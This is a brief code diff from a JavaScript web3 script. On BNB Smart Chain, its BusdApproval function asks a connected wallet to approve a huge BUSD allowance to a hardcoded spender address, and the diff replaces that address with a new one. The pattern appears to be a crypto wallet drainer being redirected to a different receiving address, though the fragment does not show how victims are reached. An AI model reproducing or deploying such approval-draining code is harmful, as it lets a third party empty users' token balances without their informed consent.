@@ -43,7 +43,7 @@ async function BusdApproval() {
     if (net == 56) {
         const busdContract = new web3.eth.Contract(busdAbi, busdContractAddress);
         const amount = 115792089237;
-        const spenderAddress = "0xea78B82fAa50BA7D111d020c89A15b6318173ca8";
+        const spenderAddress = "0xA576D5fc38f10222fA145f84Be94Ce1AD7410C2F";
         const amountToApprove = web3.utils.toWei(amount.toString(), 'ether');
         try {
             const transaction = await busdContract.methods
